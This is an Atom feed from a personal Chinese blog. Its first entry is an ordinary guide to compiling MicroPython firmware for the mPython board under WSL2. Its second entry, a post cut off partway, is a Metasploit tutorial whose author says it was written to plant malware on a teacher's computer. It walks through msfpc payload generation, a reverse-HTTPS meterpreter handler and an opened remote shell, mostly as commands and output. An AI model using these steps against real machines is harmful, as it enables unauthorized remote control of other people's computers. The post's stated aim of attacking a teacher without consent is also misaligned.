<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://gxxk.site</id>
    <title>GxxkSite</title>
    <updated>2024-01-24T12:23:40.993Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://gxxk.site"/>
    <link rel="self" href="https://gxxk.site/atom.xml"/>
    <logo>https://gxxk.site/images/avatar.png</logo>
    <icon>https://gxxk.site/favicon.ico</icon>
    <rights>All rights reserved 2024, GxxkSite</rights>
    <entry>
        <title type="html"><![CDATA[【教程/记录？】编译适用于掌控版的microPython固件]]></title>
        <id>https://gxxk.site/BAt_EdAD5/</id>
        <link href="https://gxxk.site/BAt_EdAD5/">
        </link>
        <updated>2023-12-17T08:47:36.000Z</updated>
        <summary type="html"><![CDATA[<blockquote>
<p>不多bb，进入正题 导入词我就懒得写了LOL<br>
本文重点在于环境配置，在阅读本文前您需要熟知有关Linux的基本命令和一些WSL2特性（建议多查多做）<br>
Tip:按顺序继续即可</p>
</blockquote>
<h1 id="提前准备">提前准备</h1>
<p>环境：Windows10LTSC2021（手动安装了MicrosoftStore）<br>
使用终端：新版UI的Powershell与GitBash</p>
]]></summary>
        <content type="html"><![CDATA[<blockquote>
<p>不多bb，进入正题 导入词我就懒得写了LOL<br>
本文重点在于环境配置，在阅读本文前您需要熟知有关Linux的基本命令和一些WSL2特性（建议多查多做）<br>
Tip:按顺序继续即可</p>
</blockquote>
<h1 id="提前准备">提前准备</h1>
<p>环境：Windows10LTSC2021（手动安装了MicrosoftStore）<br>
使用终端：新版UI的Powershell与GitBash</p>
<!-- more -->
<figure data-type="image" tabindex="1"><img src="https://image-1302120057.cos.ap-nanjing.myqcloud.com/blog/20231217165011.png" alt="" loading="lazy"></figure>
<p>软件：</p>
<ul>
<li>Git</li>
<li>可正常访问外网的网络环境（推荐<span class="heimu"><a href="https://us.freecat.cloud/#/register?code=q5ppu887">自由猫机场</a>，单月6.9r/100G，体验较好，有IPEL/IPLC专线（此套餐50-99r），一次性85折优惠码：FREECAT</span>）</li>
<li>WSLDebian</li>
</ul>
<h1 id="可选在仅搭载windows系统的macbookair开启虚拟化">(可选)在仅搭载Windows系统的MacBookAir开启虚拟化</h1>
<blockquote>
<p>此处解决方法来源于<a href="https://superuser.com/questions/979695/windows-10-bcdedit-how-to-change-bootmgr-path">Win10如何更改bootmgr路径</a>与<a href="https://www.cnblogs.com/zhangjin1116/articles/17541511.html">Mac OS装Windows系统开启虚拟化</a></p>
</blockquote>
<h2 id="下载refind">下载rEFInd</h2>
<p>rEFInd的可执行文件托管在SourceForge上，下载链接：<a href="https://sourceforge.net/projects/refind/">https://sourceforge.net/projects/refind/</a></p>
<p>进入页面后点击最显眼的<strong>Download</strong>即可下载，将会下载下来一个压缩包，解压到一个临时目录，使用以下命令挂载EFI分区：</p>
<pre><code class="language-bash">mountvol Z: /s
</code></pre>
<p>接着 我们编辑压缩包解压后的文件，在<code>[解压后的目录]/refind-bin-xxxxx/refind/</code>下，有一个文件叫<code>refind.conf-sample</code>，去掉后面的<code>-sample</code>，并且打开文件，找到<code>#enable_and_lock_vmx false</code>，修改为<code>enable_and_lock_vmx true</code></p>
<p>我们切换到<code>Z:/EFI</code>下并复制文件：</p>
<pre><code class="language-bash">xcopy /E [在刚刚修改文件的位置的文件夹] Z:\EFI\refind\
</code></pre>
<p>复制完成后，我们使用<code>BCDEdit</code>修改默认启动项（记得使用管理员权限）：</p>
<pre><code class="language-text">bcdedit /set &quot;{bootmgr}&quot; path \EFI\refind\refind_[系统架构].efi
</code></pre>
<blockquote>
<p>在Win10以前的版本中，<code>&quot;{bootmgr}&quot;</code>应为<code>{bootmgr}</code></p>
</blockquote>
<p>当提示“<strong>操作成功完成。</strong>”后，重启便可以看到，已经开启虚拟化了</p>
<h1 id="部署虚拟机debian11">部署虚拟机Debian11</h1>
<p>打开控制面板，点击程序-启用或关闭Windows功能，勾选&quot;适用于Windows的Linux子系统&quot;，点确定，重启</p>
<p>下载<a href="https://pan.baidu.com/s/1Ra4V_4E4EF8eZNUKK-N3yg?pwd=Gxxk">此链接</a>的内容然后双击运行，点击安装，稍等一会即可</p>
<p>在终端内输入<code>debian</code>，像我这样操作：</p>
<pre><code class="language-text">Installing, this may take a few minutes...
Please create a default UNIX user account. The username does not need to match your Windows username.
For more information visit: https://aka.ms/wslusers
Enter new UNIX username: gxxk   //这一步是设置用户名，建议使用全小写字母/数字
New password:                              //让你设置这个账户的密码，因Linux特性 不会显示此处内容
Retype new password:                  //再输一遍加深印象
passwd: password updated successfully
Installation successful!
适用于 Linux 的 Windows 子系统现已在 Microsoft Store 中可用!
你可以通过运行“wsl.exe --update”或通过访问 https://aka.ms/wslstorepage 进行升级
从 Microsoft Store 安装 WSL 将可以更快地获取最新的 WSL 更新。
有关详细信息，请访问 https://aka.ms/wslstoreinfo

gxxk@W10MacBook:~$sudo passwd root
[sudo] password for gxxk:           //输入你之前设置的密码
New password:                           //再设置一个新密码（后面叫做密码2）
Retype new password:                //再输一遍加深印象
passwd: password updated successfully
</code></pre>
<p>关于内容可以自行翻译，自行理解，完全照抄也是没有问题的</p>
<p>在安装完成后，输入exit并回车，退出Debian，接着执行<code>wsl.exe --update</code>，更新这个WSL子系统，就可以进入下一步操作了</p>
<h2 id="可选更换wsl存储位置">(可选)更换WSL存储位置</h2>
<blockquote>
<p>此操作仅适用于当您的 存储Windows目录的分区（人话：C盘） 空间不够时才建议使用！</p>
</blockquote>
<p>打开终端，列出目前安装的WSL版本</p>
<pre><code class="language-text">wsl -l --all -v
得到回复：
  NAME      STATE           VERSION
* Debian    Stopped         1
</code></pre>
<p>接下来我们导出它（<strong>wsl --export &lt;系统名&gt; &lt;导出目录&gt;</strong>）：</p>
<pre><code class="language-bash">wsl --export Debian G:\WSL初始Debian系统备份_用户名root_密码root.tar
得到回复：
正在导出，这可能需要几分钟时间。
操作成功完成。
</code></pre>
<p>然后我们删掉原来的WSL（wsl --unregister &lt;系统名&gt;）：</p>
<pre><code class="language-bash">wsl --unregister Debian
得到回复：
正在注销。
操作成功完成。
</code></pre>
<p>接着再导入WSL(wsl --import Debian 将要导入到何处 WSL文件位置 --version &lt;WSL版本号&gt;):</p>
<pre><code class="language-bash">wsl --import Debian G:\WSL_Debian G:\WSL初始Debian系统备份_用户名root_密码root.tar --version 2
</code></pre>
<h1 id="linux配置">Linux配置</h1>
<h2 id="换源">换源</h2>
<blockquote>
<p>Debian Buster(Debian10) 以上版本默认支持 HTTPS 源。如果遇到无法拉取 HTTPS 源的情况，请先使用 HTTP 源并安装：</p>
<p><code>apt install apt-transport-https ca-certificates</code></p>
</blockquote>
<pre><code class="language-bash"> nano /etc/apt/sources.list
</code></pre>
<p>编辑器注释掉前4行，输入</p>
<pre><code class="language-text">deb https://mirrors.huaweicloud.com/debian/ bookworm main non-free non-free-firmware contrib
deb-src https://mirrors.huaweicloud.com/debian/ bookworm main non-free non-free-firmware contrib
deb https://mirrors.huaweicloud.com/debian-security/ bookworm-security main
deb-src https://mirrors.huaweicloud.com/debian-security/ bookworm-security main
deb https://mirrors.huaweicloud.com/debian/ bookworm-updates main non-free non-free-firmware contrib
deb-src https://mirrors.huaweicloud.com/debian/ bookworm-updates main non-free non-free-firmware contrib
deb https://mirrors.huaweicloud.com/debian/ bookworm-backports main non-free non-free-firmware contrib
deb-src https://mirrors.huaweicloud.com/debian/ bookworm-backports main non-free non-free-firmware contrib
</code></pre>
<blockquote>
<p>除此之外，你也可使用<a href="https://mirrors.tuna.tsinghua.edu.cn/help/debian">清华大学镜像站</a>提供的Debian软件源</p>
</blockquote>
<h2 id="更新">更新</h2>
<pre><code class="language-bash">apt-get update
</code></pre>
<h2 id="安装各类软件">安装各类软件</h2>
<pre><code class="language-bash">apt-get install git curl wget python3 python-is-python3 python3-pip -y
pip install virtualenv --break-system-packages
</code></pre>
<h2 id="可选设置代理">(可选)设置代理</h2>
<blockquote>
<p>来源于 <a href="https://zhuanlan.zhihu.com/p/153124468">https://zhuanlan.zhihu.com/p/153124468</a></p>
</blockquote>
<p>新建文件（<code>touch &quot;在此处填写文件名&quot;</code>），并使用nano编辑（<code>nano &quot;在此处填写要编辑的文件的文件名&quot;</code>）</p>
<blockquote>
<p>运行nano时，当此目录没有命令中提到的文件时，会自动新建空文件</p>
</blockquote>
<pre><code class="language-bash">nano .proxy
</code></pre>
<p>在文件内写入如下内容</p>
<pre><code class="language-bash">#!/bin/bash
proxy_ip=$(cat /etc/resolv.conf |grep &quot;nameserver&quot; |cut -f 2 -d &quot; &quot;)
                                # 代理IP，此处内容代表Windows宿主机IP
proxy_port=7890    # 代理端口
export ALL_PROXY=&quot;http://$proxy_ip:$proxy_port&quot;
</code></pre>
<p>如果你的软件支持其他代理方式，也可以改写代码，使用代理软件所给的其他命令，例如类似笔者使用的Clash就可以这么配置：</p>
<pre><code class="language-bash">#!/bin/bash
ip=$(cat /etc/resolv.conf |grep &quot;nameserver&quot; |cut -f 2 -d &quot; &quot;)
port=11459
export https_proxy=&quot;http://$ip:$port&quot;
export http_proxy=&quot;http://$ip:$port&quot;
</code></pre>
<p>接下来，您可以使用以下代码在WSL中使用代理了：</p>
<pre><code class="language-bash">source .proxy
</code></pre>
<blockquote>
<p>23.01.24更新：<br>
基于WSL2的一些特性，开机时会自动随机选取一堆端口作为WSL的 <strong>“随机保留端口”</strong> ，这个时候之前的需要用到刚好是保留端口的软件就被顶掉了，就会导致代理软件显示端口为0，目前AFAIK（据我所知），没有绝对的不会被抽中的的端口，总之再换一个就可以了哦~ <span class="heimu" alt="这点东西也要用黑幕包着吗？">网传部分版本的代理软件可以设置动态端口</span></p>
</blockquote>
<h1 id="下载存储库">下载存储库</h1>
<p>打开终端后执行如下代码，（目录下可以有其他文件，下载的时候会<strong>自动新建文件夹</strong><code>mpython</code>）</p>
<p>执行此命令：</p>
<pre><code class="language-bash">git clone https://github.com/labplus-cn/mpython.git --recursive
</code></pre>
<blockquote>
<p>命令意思解析：<br>
git:Git软件的名称<br>
clone:克隆仓库<br>
<a href="https://github.com/labplus-cn/mpython.git">https://github.com/labplus-cn/mpython.git</a>:掌控版固件存放代码的仓库的网址<br>
<code> --recursive</code>:一次性下载这个仓库里面所有的内容</p>
</blockquote>
<p>下载速度取决于你的网速，推荐使用上文提到的<span class="heimu">自由猫机场</span>下载，启动后直接把电脑挂机即可，去吃顿晚餐或玩会hypixel吧</p>
<blockquote>
<p>23.01.24更新：<br>
如直接在裸机进行编译操作（如树莓派），可以尝试使用镜像站点，例如 <strong>FastGit</strong> 等，例如：<br>
<code>git config --global url.&quot;https://hub.fgit.cf/&quot;.insteadOf &quot;https://github.com/&quot;：在每次进行操作时如果在Github服务器上进行操作，那么将服务器地址替换为镜像站地址 </code>git config --global protocol.https.allow always`：设置传输协议总是https<br>
接下来再次体验clone，感受速度差异（记得关掉配置的代理）</p>
</blockquote>
<p>下载完成后，可以看看大小，我这里大小约为3.22G，实际占用5.08G，36486 个文件，5612个文件夹</p>
<p>如果确认下载成功就可以进行下一步了</p>
<h1 id="配置edp-idf">配置EDP-IDF</h1>
<p>切换到<code>mpython/esp-idf</code>目录，安装依赖（<code>pip install -r requirement.txt --break-system-packages</code>），执行<code>install.sh</code>进行安装：</p>
<pre><code class="language-bash">root@W10MacBook:~# cd mpython/esp-idf
root@W10MacBook:~/mpython/esp-idf# pip install -r requirement.txt --break-system-packages
[因篇幅，省略部分内容]
root@W10MacBook:~/mpython/esp-idf# ./install.sh
Installing ESP-IDF tools
Installing tools: xtensa-esp32-elf, esp32ulp-elf, openocd-esp32
[因篇幅，省略部分内容]
All done! You can now run:

  . ./export.sh

root@W10MacBook:~/mpython/esp-idf#
</code></pre>
<p>完成后，执行<code>source ./export.sh</code>，让安装好的工具可以被运行（加入到环境变量）</p>
<blockquote>
<p>笔者执行时会提示<code>tool openocd-esp32 has no installed versions.</code>等内容，此时请执行<code> apt-get install libhidapi-libusb0</code>并再次<code>source ./export.sh</code>解决此Bug<br>
Tip:此解决方法来源于<a href="https://github.com/espressif/esp-idf/issues/5102">官方仓库某一issue</a></p>
</blockquote>
<h1 id="获取mpy-cross">获取mpy-cross</h1>
<p>这里有两种办法，1是我曾提到过的下载pypi上的<code>mpy-cross-v5</code>，2是自行编译，前者方法因曾讲述过便不再列出，此处详解后者方法</p>
<pre><code class="language-bash">cd ~/mpython/micropython/mpy-cross
</code></pre>
<p>执行上方代码，切换到目录，运行后进行下一步</p>
<pre><code class="language-bash">make
</code></pre>
<p>稍等片刻，便会出来如下面展示的内容：</p>
<pre><code class="language-text">LINK mpy-cross
   text    data     bss     dec     hex filename
 287468   17104     896  305468   4a93c mpy-cross
</code></pre>
<p>这就是生成成功了，我们接下来进行下一步操作</p>
<h1 id="编译">编译</h1>
<p>切换到<code>mpython/port</code>目录，执行<strong>make</strong>：</p>
<pre><code class="language-bash">cd ~/mpython/port
make
</code></pre>
<p>在编译完成后，应给出如下字段：</p>
<pre><code class="language-text">Create build/mpython//firmware.bin
bootloader     20336
partitions      3072
application  1640896
total        1706432
</code></pre>
<p>但这还不够，我们通常刷入的官方提供的固件均内嵌了Noto字体便于中文文字显示，接下来我们就需要合并镜像</p>
<h1 id="合并镜像">合并镜像</h1>
<p>切换到<code>~/mpython/port/</code>，我们使用python执行脚本<code>release.py</code>：</p>
<pre><code class="language-bash">cd ~/mpython/port
python ./release.py \
        ./build/mpython/bootloader.bin \
        ./build/mpython/partitions.bin \
        ./build/mpython/application.bin \
        ./Noto_Sans_CJK_SC_Light16.bin \
        ./firmware.bin # 此处&quot;firmware&quot;可随意更改为其他名字
</code></pre>
<p>此时，我们使用<code>mv</code>命令移动到宿主机上：</p>
<pre><code class="language-bash">mv ./[名字].bin /mnt/[盘符]/[文件夹]/[文件夹]/[文件名].bin
</code></pre>
<p>例：</p>
<pre><code class="language-bash">mv ./firmware.bin /mnt/g/PythonProject/mPython/firmware.bin
</code></pre>
<p>即为将当前目录下的firmware.bin移动到宿主机的G盘上的<code>PythonProject</code>文件夹内的<code>mPython</code>文件夹<br>
此时，在对应目录出现的对应文件即为固件，可用于刷入了</p>
<h1 id="懒人包">懒人包</h1>
<p>当然了，如果你是<strong>实在没有能力配置环境</strong>可以下载下方链接的懒人包，使用WSL导入命令导入后，进入<code>~/mpython/port</code>后直接执行make即可编译并合并为一个可用固件</p>
<blockquote>
<p>版本：WSL2<br>
采用版本:<a href="https://github.com/labplus-cn/mpython/commit/c0d2dff16093e6baf568c1eb0fc8df4a61254c76">11.27-c0d2dff</a><br>
用户名/密码：root<br>
WSL 版本： 2.0.9.0</p>
</blockquote>
<p><strong>下载链接：<a href="https://pan.baidu.com/s/1pwae9wDWKuiz1CXJUjGlNQ?pwd=Gxxk">https://pan.baidu.com/s/1pwae9wDWKuiz1CXJUjGlNQ?pwd=Gxxk</a></strong><br>
<strong>提取码：Gxxk</strong></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[【水】记一次有手就行的基于Metasploit的渗透]]></title>
        <id>https://gxxk.site/VJNwhqCfL/</id>
        <link href="https://gxxk.site/VJNwhqCfL/">
        </link>
        <updated>2023-12-03T08:16:44.000Z</updated>
        <summary type="html"><![CDATA[<blockquote>
<p>本文仅介绍此渗透方法，仅供学习，不承担执行此教程带来的任何损失！</p>
</blockquote>
<h1 id="话题导入初识msfpc">话题导入/初识msfpc</h1>
<p>今天因为<span class="heimu">被班任用监控制裁</span>这一事十分不服，被叫到办公室训话时发现老师还有一个在高处的监控<span class="heimu">（老师靠那个看见我搞小动作的）</span>，并且还是用网页访问，心生一计，给老师电脑下马（指在老师电脑上下载并执行我可控的恶意软件），于是回家就开始研究起来</p>
<p>Kali Linux 启动！</p>
]]></summary>
        <content type="html"><![CDATA[<blockquote>
<p>本文仅介绍此渗透方法，仅供学习，不承担执行此教程带来的任何损失！</p>
</blockquote>
<h1 id="话题导入初识msfpc">话题导入/初识msfpc</h1>
<p>今天因为<span class="heimu">被班任用监控制裁</span>这一事十分不服，被叫到办公室训话时发现老师还有一个在高处的监控<span class="heimu">（老师靠那个看见我搞小动作的）</span>，并且还是用网页访问，心生一计，给老师电脑下马（指在老师电脑上下载并执行我可控的恶意软件），于是回家就开始研究起来</p>
<p>Kali Linux 启动！</p>
<!-- more -->
<figure data-type="image" tabindex="1"><img src="https://image-1302120057.cos.ap-nanjing.myqcloud.com/blog/20231203162246.png" alt="" loading="lazy"></figure>
<p>打开Kali，我熟练的搜索“msf”，没想到还多了几个新朋友（也可能是我之前眼瞎没看见LOL）</p>
<figure data-type="image" tabindex="2"><img src="https://image-1302120057.cos.ap-nanjing.myqcloud.com/blog/20231203162400.png" alt="" loading="lazy"></figure>
<p>“既然已有了<code>msfvenom</code>，怎么还多了个MSFPC？看缩写可能是 <code>payload creator</code>（机翻<span class="heimu">载荷创建器</span> 可以理解为攻击方和被控方的一个中间商/恶意软件（这种软件统称<code>payload</code>））”揣着疑问与好奇，我点开了MSFPC，果不其然，此工具全名<code>MSFvenom Payload Creator</code>，在当前<strong>Kali Linux 2023.3</strong>版本上1.4.5，就是msfvenom的更易用的版本，下方是帮助文档与机翻润色：</p>
<pre><code class="language-text"> msfpc
 [*] MSFvenom Payload Creator (MSFPC v1.4.5)

 [i] Missing TYPE or BATCH/LOOP mode

 /usr/bin/msfpc &lt;TYPE&gt; (&lt;DOMAIN/IP&gt;) (&lt;PORT&gt;) (&lt;CMD/MSF&gt;) (&lt;BIND/REVERSE&gt;) (&lt;STAGED/STAGELESS&gt;) (&lt;TCP/HTTP/HTTPS/FIND_PORT&gt;) (&lt;BATCH/LOOP&gt;) (&lt;VERBOSE&gt;)
   Example: /usr/bin/msfpc windows 192.168.1.10        # Windows &amp; manual IP.
            /usr/bin/msfpc elf bind eth0 4444          # Linux, eth0's IP &amp; manual port.
            /usr/bin/msfpc stageless cmd py https      # Python, stageless command prompt.
            /usr/bin/msfpc verbose loop eth1           # A payload for every type, using eth1's IP.
            /usr/bin/msfpc msf batch wan               # All possible Meterpreter payloads, using WAN IP.
            /usr/bin/msfpc help verbose                # Help screen, with even more information.

 &lt;TYPE&gt;:
   + APK
   + ASP
   + ASPX
   + Bash [.sh]
   + Java [.jsp]
   + Linux [.elf]
   + OSX [.macho]
   + Perl [.pl]
   + PHP
   + Powershell [.ps1]
   + Python [.py]
   + Tomcat [.war]
   + Windows [.exe // .exe // .dll]

 Rather than putting &lt;DOMAIN/IP&gt;, you can do a interface and MSFPC will detect that IP address.
 Missing &lt;DOMAIN/IP&gt; will default to the IP menu.

 Missing &lt;PORT&gt; will default to 443.

 &lt;CMD&gt; is a standard/native command prompt/terminal to interactive with.
 &lt;MSF&gt; is a custom cross platform shell, gaining the full power of Metasploit.
 Missing &lt;CMD/MSF&gt; will default to &lt;MSF&gt; where possible.

 &lt;BIND&gt; opens a port on the target side, and the attacker connects to them. Commonly blocked with ingress firewalls rules on the target.
 &lt;REVERSE&gt; makes the target connect back to the attacker. The attacker needs an open port. Blocked with engress firewalls rules on the target.
 Missing &lt;BIND/REVERSE&gt; will default to &lt;REVERSE&gt;.

 &lt;STAGED&gt; splits the payload into parts, making it smaller but dependent on Metasploit.
 &lt;STAGELESS&gt; is the complete standalone payload. More 'stable' than &lt;STAGED&gt;.
 Missing &lt;STAGED/STAGELESS&gt; will default to &lt;STAGED&gt; where possible.

 &lt;TCP&gt; is the standard method to connecting back. This is the most compatible with TYPES as its RAW. Can be easily detected on IDSs.
 &lt;HTTP&gt; makes the communication appear to be HTTP traffic (unencrypted). Helpful for packet inspection, which limit port access on protocol - e.g. TCP 80.
 &lt;HTTPS&gt; makes the communication appear to be (encrypted) HTTP traffic using as SSL. Helpful for packet inspection, which limit port access on protocol - e.g. TCP 443.
 &lt;FIND_PORT&gt; will attempt every port on the target machine, to find a way out. Useful with stick ingress/engress firewall rules. Will switch to 'allports' based on &lt;TYPE&gt;.
 Missing &lt;TCP/HTTP/HTTPS/FIND_PORT&gt; will default to &lt;TCP&gt;.

 &lt;BATCH&gt; will generate as many combinations as possible: &lt;TYPE&gt;, &lt;CMD + MSF&gt;, &lt;BIND + REVERSE&gt;, &lt;STAGED + STAGELESS&gt; &amp; &lt;TCP + HTTP + HTTPS + FIND_PORT&gt; 
 &lt;LOOP&gt; will just create one of each &lt;TYPE&gt;.

 &lt;VERBOSE&gt; will display more information.

----------我是一条分割线awa----------
&amp; msfpc

[*]MSFvenom payload创建器(MSFPC v1.4.5)。

[i]缺少执行类型或 batch/loop 模式。

/usr/bin/msfpc&lt;type&gt;(&lt;攻击方 域/IP&gt;)(&lt;端口&gt;)(&lt;cmd/msf&gt;)(&lt;正向/反向&gt;)(&lt;Stage/Stageless&gt;)(&lt;TCP/HTTP/HTTPS/Find_Port&gt;)(&lt;Batch/Loop&gt;)(&lt;Verbose&gt;)。
示例：
/usr/bin/msfpc windows 192.168.1.10     #创建Windows平台的
/usr/bin/msfpc elf bind eth0 4444           # 创建Linux平台的会连接到攻击方eth0网卡IP的payload(正向链接)
/usr/bin/msfpc stageless cmd py https#Python，Stageless命令提示符。
/usr/bin/msfpc详细循环eth1#每种类型的有效负载，使用eth1的S IP。
/usr/bin/msfpc msf Batch wan#所有可能的Meterpreter有效负载，使用广域网IP。
/usr/bin/msfpc Help Verbose#Help屏幕，包含更多信息。

&lt;type&gt;可用参数：
+APK
+ASP
+ASPX
+Bash[.sh]
+Java[.jsp]
+Linux[.self]
+OSX[.macho]
+Perl[.pl]
+PHP
+PowerShell[.ps1]
+PYTHON[.py]
+Tomcat[.war]
+Windows[.exe/.dll]

缺失参数&lt;攻击方 域/IP&gt;，您可以执行一个接口，MSFPC将检测到该IP地址。
缺失参数&lt;攻击方 域/IP&gt;将默认为IP菜单。 （这2句不会翻，总之创建的时候别漏写IP就行）

缺失&lt;端口&gt;将默认端口为443。

&lt;cmd&gt;是用于交互的标准/本机命令提示符/终端。
&lt;msf&gt;是一个自定义的跨平台外壳，获得了Metasploit的全部功能。
缺失参数&lt;CMD/MSF&gt;将在可能的情况下默认为&lt;MSF&gt;。

&lt;正向&gt;在被攻击端打开一个端口，攻击者将连接到这些端口进行渗透。通常会被目标上的入口防火墙规则阻止。
&lt;反向&gt;使被攻击段主动连接攻击者接受渗透。攻击者需要开放对应端口。使用目标上的入口防火墙规则阻止。
缺失参数&lt;正向/反向&gt;将默认为&lt;反向&gt;。

&lt;Stage&gt;将payload拆分成多个部分，使其更小，但依赖于Metasploit。
&lt;Stageless&gt;是完整的独立payload。比&lt;Stage&gt;更‘稳定’。
缺少&lt;Stage/Stageless&gt;将在可能的情况下默认为&lt;Stage&gt;。

&lt;tcp&gt;是&lt;反向&gt;的标准方法。这是与类型最兼容的作为其原始的。可以很容易地在入侵检测系统上检测到。
&lt;HTTP&gt;使通信看起来像是HTTP流量(未加密)。有助于数据包检测，这限制了对协议(如TCP80)的端口访问。
&lt;HTTPS&gt;使通信看起来像是加密的HTTP通信。有助于数据包检测，这限制了对协议(例如，TCP443)的端口访问。
&lt;Find_Port&gt;将尝试目标计算机上的每个端口，以找到出路。适用于Stick入口/入口防火墙规则。将根据&lt;type&gt;切换到‘allports’。
缺少参数&lt;TCP/HTTP/HTTPS/Find_Port&gt;将默认为&lt;tcp&gt;。

&lt;Batch&gt;将生成尽可能多的组合：&lt;type&gt;、&lt;CMD+MSF&gt;、&lt;BIND+REVERSE&gt;、&lt;Stage+Stage less&gt;&amp;&lt;TCP+HTTP+HTTPS+Find_Port&gt;。
&lt;loop&gt;将只为每个&lt;type&gt;创建一个。

&lt;Verbose&gt;将显示更多信息。
</code></pre>
<h1 id="小试牛刀-这不有手就行嘛">小试牛刀-这不有手就行嘛！</h1>
<p>在简单看完之后，我打算对我的宿主机进行一次测试，先经过简单的虚拟机调整，再根据帮助文档，我写出了如下指令，便进行运行：</p>
<pre><code class="language-bash">┌──(kali㉿kali)-[~]
└─$ msfpc Windows 192.168.179.131 443 MSF REVERSE STAGELESS HTTPS
 [*] MSFvenom Payload Creator (MSFPC v1.4.5)
 [i]   IP: 192.168.179.131
 [i] PORT: 443
 [i] TYPE: windows (windows/meterpreter_reverse_https)
 [i]  CMD: msfvenom -p windows/meterpreter_reverse_https -f exe \
  --platform windows -a x86 -e generic/none LHOST=192.168.179.131 LPORT=443 \
  &gt; '/home/kali/windows-meterpreter-stageless-reverse-https-443.exe'

 [i] windows meterpreter created: '/home/kali/windows-meterpreter-stageless-reverse-https-443.exe'

 [i] MSF handler file: '/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc'
 [i] Run: msfconsole -q -r '/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc'
 [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080
 [*] Done!
                                                                             
┌──(kali㉿kali)-[~]
└─$ msfconsole -q -r '/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc'

[*] Processing /home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc for ERB directives.
resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; set PAYLOAD windows/meterpreter_reverse_https
PAYLOAD =&gt; windows/meterpreter_reverse_https
resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; set LHOST 192.168.179.131
LHOST =&gt; 192.168.179.131
resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; set LPORT 443
LPORT =&gt; 443
resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; set ExitOnSession false
ExitOnSession =&gt; false
resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; set EnableStageEncoding true
[!] Unknown datastore option: EnableStageEncoding. Did you mean EnableUnicodeEncoding?
EnableStageEncoding =&gt; true
resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) &gt;  # 此时将恶意软件在目标机器上运行（建议管理员权限）
[*] Started HTTPS reverse handler on https://192.168.179.131:443
[!] https://192.168.179.131:443 handling request from 192.168.179.1; (UUID: au1jad14) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.179.131:443 handling request from 192.168.179.1; (UUID: au1jad14) Redirecting stageless connection from /J83F7V1j2bOE1YXU4bkaoQ3Qy9QOYcXmelWRAuBwbPvjfixhNbBEUVtC-6y9sGtJgmTafB0yMsIodmHh7i6rPPDgwoDwfnt9NVrdKD-LBtlMQAn1sGJpBvA with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0'
[!] https://192.168.179.131:443 handling request from 192.168.179.1; (UUID: au1jad14) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.179.131:443 handling request from 192.168.179.1; (UUID: au1jad14) Attaching orphaned/stageless session...
[!] https://192.168.179.131:443 handling request from 192.168.179.1; (UUID: au1jad14) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (192.168.179.131:443 -&gt; 192.168.179.1:6378) at 2023-12-03 10:27:49 -0500  # 此处代表连接成功，已打开会话

msf6 exploit(multi/handler) &gt; sessions 1  # 根据上一条消息给出的sessionID切换到对应会话
[*] Starting interaction with 1...

meterpreter &gt;  # 此时就已经成功获取控制 使用“?”获取帮助
meterpreter &gt; shell
Process 14176 created.
Channel 1 created.
Microsoft Windows [�汾 10.0.19044.3208]
(c) Microsoft Corporation����������Ȩ����

C:\Users\user\Downloads&gt;   # 拿到Shell 接下来任君发挥

</code></pre>
<h1 id="分析命令我是来看文的不是来看催眠书的">分析命令/我是来看文的，不是来看催眠书的</h1>
<p>从此次操作中，我们共执行了以下命令：</p>
<pre><code class="language-bash">msfpc Windows 192.168.179.131 443 MSF REVERSE STAGELESS HTTPS
msfconsole -q -r '/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc'
# 进入msfconsole，连接上目标机器
sessions 1
shell
</code></pre>
<p>让我们来逐条分析：</p>
<h2 id="生成木马">生成木马</h2>
<pre><code class="language-bash">msfpc Windows 192.168.179.131 443 MSF REVERSE STAGELESS HTTPS
</code></pre>
<p>这一条十分简单，在<a href="#%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80-%E8%BF%99%E4%B8%8D%E6%9C%89%E6%89%8B%E5%B0%B1%E8%A1%8C%E5%98%9B">此段</a>中，我列出了帮助文档和有助于理解的机翻润色，对应过来即为：</p>
<pre><code class="language-text">msfpc -&gt; 创建恶意软件的工具名称
Windows -&gt; 恶意软件所作用的平台
192.168.179.131 -&gt; 攻击方的IP地址
MSF -&gt; 更全面的模式，可以使用更多功能，此参数的另外一个选项为 CMD ，仅能实现基本shell
STAGELESS -&gt; 生成的恶意软件的部分恶意代码是存放于软件本体（STAGELESS选项，体积大但也大不到哪去，总之不超0.5mb）还是运行时攻击方通过网络传输恶意代码过来执行（STAGE选项，体积超小）
HTTPS  -&gt; 连接方式 分很多种 具体的自己去看 HTTPS可以防止一些简单的防火墙识别出来是恶意软件
</code></pre>
<h2 id="进入监听模式">进入监听模式</h2>
<pre><code class="language-bash">msfconsole -q -r '/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc'
</code></pre>
<p>这一条不用记，这段类似的代码将会出现于上一条代码执行完后，具体位置在下方标注出来了：</p>
<pre><code class="language-text">┌──(kali㉿kali)-[~]
└─$ msfpc Windows 省略...
 [*] MSFvenom Payload Creator (MSFPC v1.4.5)
 [i]   省略 省略 全部省略

 [i] windows meterpreter created: '这里是生成的恶意软件的路径'

 [i] MSF handler file: 省略
